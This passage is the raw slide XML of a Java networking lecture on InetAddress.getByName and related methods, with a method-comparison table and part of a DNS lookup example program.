                        <a:rPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="404040"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="+mn-lt"/>
                          <a:ea typeface="+mn-ea"/>
                          <a:cs typeface="+mn-cs"/>
                        </a:rPr>
                        <a:t> </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="2400" b="0" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="404040"/>
                        </a:solidFill>
                        <a:effectLst/>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228600" y="3823908"/>
          <a:ext cx="11388724" cy="2429784"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2544829"/>
                <a:gridCol w="2947965"/>
                <a:gridCol w="2947965"/>
                <a:gridCol w="2947965"/>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l"/>
                      <a:r>
                        <a:rPr lang="en-US" b="1">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Feature</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>
                        </a:solidFill>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a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Factory Method</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>
                        </a:solidFill>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a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Instance Method</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>
                        </a:solidFill>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dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Getter Method</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" b="1" dirty="0">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>
                        </a:solidFill>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a:effectLst/>
                        </a:rPr>
                        <a:t>Static?</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US">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Yes (static)</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No</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effectLst/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="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a:effectLst/>
                        </a:rPr>
                        <a:t>Purpose</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US">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Object creation</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Object-specific logic</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State access</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a:effectLst/>
                        </a:rPr>
                        <a:t>Returns</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US">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New instance</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Any type (void allowed)</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Property value</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a:effectLst/>
                        </a:rPr>
                        <a:t>Example</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US">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InetAddress.getByName()</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isReachable()</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getHostAddress()</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a:effectLst/>
                        </a:rPr>
                        <a:t>Mutates State?</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US">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No (creates objects)</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Sometimes</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effectLst/>
                        </a:rPr>
                        <a:t>Never</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" dirty="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52400" y="126999"/>
            <a:ext cx="11277600" cy="83820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lvl="2" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="170000"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Method</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" kern="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:cs typeface="+mn-cs"/>
              </a:rPr>
              <a:t>Get IP Address from Hostname</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="3200" b="1" kern="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill>
              <a:cs typeface="+mn-cs"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="990600"/>
            <a:ext cx="11658600" cy="4572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400" dirty="0"/>
              <a:t>This method can be used to specify a domain name and retrieve the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>IP address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>corresponding to the domain name from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>the DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>is a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>type parameter, which can be used to specify the domain name of the remote host. It is defined as follows:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>If the domain name pointed to by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>host </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>corresponds to multiple </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>IPs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>returns the first </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>If the local host name is known, you can use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>method instead of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getLocalHost </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>When the value of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>host </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>localhost </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>, the returned </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>is generally </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>127.0.0.1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>host </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>is a non-existent domain name, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>will throw an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>UnknownHostException </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>host </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>an IP address, the getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>method will return the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>IP address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>regardless of whether it exists (so </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>does not verify the correctness of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>address).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>The following code demonstrates how to use the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getByName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>method:</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1546225" y="2590800"/>
            <a:ext cx="8839200" cy="33813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a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public static InetAddress getByName(String host) throws UnknownHostException</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16389" name="TextBox 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="419100" y="5715000"/>
            <a:ext cx="11353800" cy="923330"/>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solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>This method will establish a connection with the local </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS server and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>find the corresponding </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IP according to the provided name. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>It will first search in the local cache. If it can be found, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>then</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> no network connection will be established.</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="18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7">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190500" y="4114800"/>
            <a:ext cx="11544300" cy="2514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zh-CN" sz="2400" dirty="0"/>
              <a:t>java DNSLookup www.szu.edu.cn</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Running results:</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17412" name="矩形 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1752600" y="773668"/>
            <a:ext cx="8305800" cy="3293209"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>java.net.InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DNSLookup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public static void main(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>String[] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>args</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) throws Exception {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>if </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(args.length == 0)</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>                      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	String host = args[0];</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
